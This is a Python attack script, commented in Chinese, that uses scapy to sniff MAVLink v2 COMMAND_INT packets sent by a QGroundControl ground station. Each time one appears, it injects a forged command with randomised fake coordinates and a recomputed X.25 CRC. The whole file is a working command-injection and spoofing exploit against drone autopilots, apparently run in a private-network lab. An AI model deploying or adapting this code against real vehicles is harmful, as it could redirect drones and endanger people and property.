from scapy.all import sniff, UDP, IP, Raw
import socket
import struct
import math
import random

# ==== 配置 ====
target_ip = "192.168.234.129"
target_port = 14550
interface = "eth0"
crc_extra = 158 

# ==== 地理参数 ====
R = 6371000
center_lat = 51.4564923
center_lon = -2.6029472
x_orig = int(center_lat * 1e7)       # 514564923
y_orig = int(center_lon * 1e7)        # -26029472
lat_per_meter = 90
lon_per_meter = 160
max_lat_offset = lat_per_meter * 250
max_lon_offset = lon_per_meter * 250

# ==== 地理偏移 ====
def haversine(lat1, lon1, lat2, lon2):
    dlat = math.radians(lat2 - lat1)
    dlon = math.radians(lon2 - lon1)
    a = math.sin(dlat / 2) ** 2 + math.cos(math.radians(lat1)) * math.cos(math.radians(lat2)) * math.sin(dlon / 2) ** 2
    return 2 * R * math.asin(math.sqrt(a))

# ==== CRC重算 ====
def x25_crc_accumulate(byte, crc):
    tmp = byte ^ (crc & 0xFF)
    tmp ^= (tmp << 4) & 0xFF
    return ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF

def x25_crc(data: bytes, crc_extra: int):
    crc = 0xFFFF
    for b in data:
        crc = x25_crc_accumulate(b, crc)
    crc = x25_crc_accumulate(crc_extra, crc)
    return crc

# ======== 初始 payload_pool ========
hex_payloads = [
    "fd200000c0ffbe4b0000000080bf0000803f000000000000c07f"
    "fcd7ab1e505672fea0163d41c0000101720a",
    "fd20000084ffbe4b0000000080bf0000803f000000000000c07f"
    "d485ab1eb4c271fed0113e41c0000101fc2d",
    "fd20000032ffbe4b0000000080bf0000803f000000000000c07f"
    "f85eab1e0e9572fee8933d41c00001011b73",
    "fd200000b9ffbe4b0000000080bf0000803f000000000000c07f"
    "3664ab1ef73073fe91f53d41c000010178b4",
    "fd200000c3ffbe4b0000000080bf0000803f000000000000c07f"
    "e4e3ab1e613973feb6713d41c00001015ec0"
]
payload_pool = [bytes.fromhex(p) for p in hex_payloads]
coord_pool = []
last_used_index = 0

# ==== 初始化 coord_pool ====
def build_coord_pool(n=5):
    pool = []
    for _ in range(n):
        x_new = x_orig + random.randint(-max_lat_offset, max_lat_offset)
        y_new = y_orig + random.randint(-max_lon_offset, max_lon_offset)
        z_new = random.uniform(0, 25)
        pool.append(
            struct.pack('<i', x_new) +
            struct.pack('<i', y_new) +
            struct.pack('<f', z_new)
        )
    return pool

coord_pool = build_coord_pool()

# ======== 监听判断 ========
def is_command_int(pkt):
    if IP in pkt and UDP in pkt and Raw in pkt:
        if pkt[IP].src != "192.168.234.1":
            return False
        data = pkt[Raw].load
        if len(data) >= 10 and data[0] == 0xFD:
            msgid = int.from_bytes(data[7:10], "little")
            return msgid == 75
    return False

# ======== 攻击实现 ========
def handle_packet(pkt):
    global last_used_index, coord_pool, payload_pool

    data = pkt[Raw].load
    if not is_command_int(pkt):
        return

    # Step 1: 立即发送当前伪造包
    forged = payload_pool[last_used_index]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(forged, (target_ip, target_port))
    sock.close()
    print(f"[ATTACK] 已发送伪造 COMMAND_INT（索引 {last_used_index}）")

    # Step 2: 提取原始坐标
    lat_real = struct.unpack('<i', data[-18:-14])[0] / 1e7
    lon_real = struct.unpack('<i', data[-14:-10])[0] / 1e7
    alt_real = struct.unpack('<f', data[-10:-6])[0]

    # Step 3: 伪造坐标（来自 coord_pool）
    xyz = coord_pool[last_used_index]
    lat_fake = struct.unpack('<i', xyz[:4])[0] / 1e7
    lon_fake = struct.unpack('<i', xyz[4:8])[0] / 1e7
    alt_fake = struct.unpack('<f', xyz[8:12])[0]
    drift = haversine(lat_real, lon_real, lat_fake, lon_fake)

    print(f"[INFO] 原始坐标 lat={lat_real:.7f}, lon={lon_real:.7f}, alt={alt_real:.2f} m")
    print(f"[INFO] 伪造坐标 lat={lat_fake:.7f}, lon={lon_fake:.7f}, alt={alt_fake:.2f} m")
    print(f"[INFO] 偏移距离：{drift:.2f} 米")

    # Step 4: 替换 x/y/z 字段
    old = forged
    magic = old[:1]
    body = old[1:-2] 
    body_list = bytearray(body)
    body_list[-16:-12] = xyz[:4]   # x
    body_list[-12:-8] = xyz[4:8]  # y
    body_list[-8:-4] = xyz[8:12]  # z
    body_new = bytes(body_list)
  
    # Step 5: 重新计算CRC
    crc = x25_crc(body_new, crc_extra)
    crc_bytes = struct.pack('<H', crc)

    # Step 6: 正确构造伪造包
    forged_new = magic + body_new + crc_bytes
    payload_pool[last_used_index] = forged_new

    # Step 7: 用固定基准坐标生成新的伪造坐标
    x_new = x_orig + random.randint(-max_lat_offset, max_lat_offset)
    y_new = y_orig + random.randint(-max_lon_offset, max_lon_offset)
    z_new = random.uniform(0, 25)
    coord_pool[last_used_index] = (
        struct.pack('<i', x_new) +
        struct.pack('<i', y_new) +
        struct.pack('<f', z_new)
    )

    # Step 8: 打印池
    print("[POOL] 当前伪造数据池内容：")
    for idx, pkt in enumerate(payload_pool):
        lat = struct.unpack('<i', pkt[-18:-14])[0] / 1e7
        lon = struct.unpack('<i', pkt[-14:-10])[0] / 1e7
        alt = struct.unpack('<f', pkt[-10:-6])[0]
        print(f"  [索引 {idx}] lat={lat:.7f}, lon={lon:.7f}, alt={alt:.2f}m | 包头: {pkt.hex()[:20]}...")
    print("-" * 60 + "\n")

    # Step 9: 循环索引
    last_used_index = (last_used_index + 1) % 5

# ==== 启动监听 ====
print("[INFO] 攻击监听启动，等待 QGC 发送 COMMAND_INT...")
sniff(
    iface=interface,
    filter="udp port 14550",
    prn=handle_packet,
    lfilter=is_command_int,
    store=0
)
